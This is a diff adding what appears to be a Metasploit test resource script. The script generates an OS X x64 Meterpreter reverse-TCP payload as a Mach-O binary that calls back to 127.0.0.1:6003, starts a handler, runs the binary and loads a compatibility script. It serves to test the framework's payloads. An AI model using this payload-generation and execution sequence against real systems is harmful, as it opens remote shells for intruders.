@@ -1,0 +1,22 @@
+## Load test modules
+loadpath test/modules
+
+## Payload
+use osx/x64/meterpreter_reverse_tcp
+
+## Set global datastore
+irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/osxx64meterpreter_reverse_tcp_session_tlv_logging20231026-4615-13rw5ttxt
+
+## Generate command
+generate -o /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/child-process-rb-osx-x---meterpreter-reverse-tcp20231026-4615-5lwkf -f macho AutoVerifySessionTimeout=30 lport=6003 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/osxx64meterpreter_reverse_tcp_debug_log20231026-4615-hjrlkgtxt MeterpreterTryToFork=false MeterpreterDebugBuild=true
+
+## Create listener
+to_handler
+
+## Execute command
+/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/child-process-rb-osx-x---meterpreter-reverse-tcp20231026-4615-5lwkf
+
+
+## Replication commands
+resource scripts/resource/meterpreter_compatibility.rc
